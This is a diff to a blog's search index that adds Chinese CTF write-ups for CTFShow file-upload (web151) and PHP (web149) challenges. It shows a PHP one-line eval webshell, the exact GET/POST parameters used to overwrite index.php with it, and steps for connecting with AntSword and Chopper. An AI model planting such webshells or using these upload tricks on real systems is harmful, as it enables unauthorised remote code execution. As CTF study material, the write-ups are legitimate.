@@ -1,6 +1,26 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTFShow-文件上传</title>
+    <url>/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
+    <content><![CDATA[<h1 id="CTFShow-文件上传"><a href="#CTFShow-文件上传" class="headerlink" title="CTFShow 文件上传"></a>CTFShow 文件上传</h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><span id="more"></span>
+
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151.png"></p>
+<p>先来上传一张正常图片发现不能上传jpg格式，可以上传png格式.并返回了上传路径: /upload/2.png</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
+<p>使用 Burp 抓包将一句话图片更改后缀为.php ,并成功返回了上传路径 /upload/yjh.php</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_2.png"></p>
+<p>蚁剑连接。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_3.png"></p>
+<p>成功在上一级目录中找到了flag<br><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_4.png"></p>
+<p>也可以不用蚁剑，直接访问上传的文件，并post 传入 一句话木马的密码=你想构造的语句。</p>
+<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_5.png"></p>
+]]></content>
+      <categories>
+        <category>CTF笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CTFShow 文件包含笔记</title>
     <url>/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="CTFShow-文件包含笔记"><a href="#CTFShow-文件包含笔记" class="headerlink" title="CTFShow 文件包含笔记"></a>CTFShow 文件包含笔记</h1><h2 id="web78——文件包含——php伪协议"><a href="#web78——文件包含——php伪协议" class="headerlink" title="web78——文件包含——php伪协议"></a>web78——文件包含——php伪协议</h2><p>源码:</p>
@@ -1602,6 +1622,27 @@
 <ul>
 <li>题目提示中说 用中文。这属实没懂。</li>
 </ul>
+<h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-19 04:34:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>根据题目提示：你写的快还是我删的快？</li>
+<li>unlink() 删除文件的函数。$file !== index.php 可知要想不执行unlink $file 必须得是 index.php </li>
+<li>结合 : file_put_contents($_GET[‘ctf’], $_POST[‘show’]); 得知，file_put_contents() 将一个字符串写入文件。那么可得 ctf=index.php show=<?php @eval($_POST[mm]);?></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get: ?ctf=index.php</span><br><span class="line">post: show=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web149.png"></p>
+<ul>
+<li>这时就将 index.php 重写为了 一句话木马。再次访问 index.php 没有任何显示。</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web149_1.png"></p>
+<ul>
+<li>打开菜刀连接 index.php 密码: mm 连接。</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web149_2.png"></p>
+<h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><p>没做</p>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
